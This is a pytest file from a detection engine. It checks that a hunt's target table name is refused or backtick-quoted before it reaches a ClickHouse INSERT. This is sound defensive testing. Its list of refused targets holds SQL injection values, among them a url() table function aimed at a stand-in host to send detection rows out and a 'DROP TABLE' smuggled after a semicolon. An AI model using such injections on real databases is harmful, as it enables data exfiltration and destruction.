#  Project:      dfe-engine
#  File:         tests/hunt_runner/test_hunt_target_table.py
#  Purpose:      A hunt's results table can only ever name a table
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""The runner refuses a target that is not a plain table name, and quotes the rest.

The target is hunt YAML text spliced into ``INSERT INTO``, and a hunt YAML can be
committed straight into the deploy repo, so the compile is a gate in its own
right. ``FUNCTION url(...)`` as a target would send every detection row to
another host. The address below is in the documentation range (RFC 5737).
"""

from pathlib import Path

import pytest
from scalo.logger import logger

from dfe_engine.hunt_runner.rule_compiler import compile_hunt_queries
from dfe_engine.hunts.hunt_output import HuntResultSchema
from dfe_engine.hunts.rule_model import Rule
from dfe_engine.hunts.rule_registry import RuleRegistry

# Targets that are not a plain table or database.table, each refused wherever it is named.
REFUSED_TARGETS = {
    "table function": "FUNCTION url('http://203.0.113.9/x', 'JSONEachRow') -- .x",
    "space": "dfe.detection results",
    "parentheses": "dfe.detection()",
    "single quote": "dfe.det'ection",
    "double quote": 'dfe."detection"',
    "backtick": "`dfe`.`detection`",
    "comment marker": "dfe.detection -- trailing",
    "block comment": "dfe.detection/*x*/",
    "semicolon": "dfe.detection; DROP TABLE dfe.main",
    "two dots": "cluster.dfe.detection",
    "leading dot": ".detection",
    "trailing dot": "dfe.",
    "leading digit": "dfe.1detection",
    "hyphen": "dfe.detection-results",
}


def _save_rule(rules_dir: Path) -> None:
    registry = RuleRegistry(rules_directory=rules_dir, writable=True, refresh_interval=0)
    try:
        registry.save(Rule(rule_id="certutil", name="Certutil", where_clause="a = 1"))
    finally:
        registry.close()


def _compile(rules_dir: Path, *, hunt_target: str = "", entry_target: str = "", default=""):
    entry: dict = {"rule_name": "certutil"}
    if entry_target:
        entry["target_table_name"] = entry_target
    definition: dict = {"rules": [entry], "global_source_table_name": "dfe.main"}
    if hunt_target:
        definition["global_target_table_name"] = hunt_target
    return compile_hunt_queries(definition, "h", rules_dir=rules_dir, default_target=default)


@pytest.mark.parametrize(
    ("target", "quoted"),
    [
        pytest.param("dfe.detection", "`dfe`.`detection`", id="database.table"),
        pytest.param("detection", "`dfe`.`detection`", id="bare table beside its source"),
        pytest.param("  _hunt_db.results_2  ", "`_hunt_db`.`results_2`", id="padded"),
    ],
)
def test_a_plain_target_compiles_quoted_into_both_inserts(tmp_path: Path, target, quoted):
    _save_rule(tmp_path)

    [statement] = _compile(tmp_path, hunt_target=target)

    assert statement.sql.startswith(f"INSERT INTO {quoted}\n")
    assert statement.summary_sql.startswith(f"INSERT INTO {quoted}\n")
    assert "FROM dfe.main" in statement.sql


@pytest.mark.parametrize("where", ["hunt", "entry", "default"])
@pytest.mark.parametrize("target", REFUSED_TARGETS.values(), ids=list(REFUSED_TARGETS))
def test_a_target_that_is_not_a_table_name_compiles_nothing(tmp_path: Path, target, where):
    _save_rule(tmp_path)
    captured: list = []
    handler_id = logger.add(captured.append, level="ERROR")
    try:
        statements = _compile(
            tmp_path,
            hunt_target=target if where == "hunt" else "",
            entry_target=target if where == "entry" else "",
            default=target if where == "default" else "",
        )
    finally:
        logger.remove(handler_id)

    assert statements == []
    [record] = captured
    assert "target refused" in record.record["message"]
    assert "is not a table name" in record.record["message"]


def test_one_refused_rule_leaves_the_hunts_other_rules_compiling(tmp_path: Path):
    _save_rule(tmp_path)

    statements = compile_hunt_queries(
        {
            "rules": [
                {"rule_name": "certutil", "target_table_name": REFUSED_TARGETS["table function"]},
                {"rule_name": "certutil"},
            ],
            "global_source_table_name": "dfe.main",
            "global_target_table_name": "dfe.detection",
        },
        "h",
        rules_dir=tmp_path,
    )

    assert [statement.sql.splitlines()[0] for statement in statements] == [
        "INSERT INTO `dfe`.`detection`"
    ]


def test_the_insert_builder_quotes_whatever_target_it_is_handed():
    # Defence in depth: even an unvalidated name can only reach ClickHouse as a table name.
    sql = HuntResultSchema().build_insert_select(
        target_db="dfe",
        target_table="FUNCTION url('http://203.0.113.9/x') -- `",
        source_db="dfe",
        source_table="main",
        where_clause="a = 1",
        rule_id="r",
        rule_name="R",
        hunt_name="h",
        severity="low",
    )

    assert sql.startswith("INSERT INTO `dfe`.`FUNCTION url('http://203.0.113.9/x') -- ```\n")
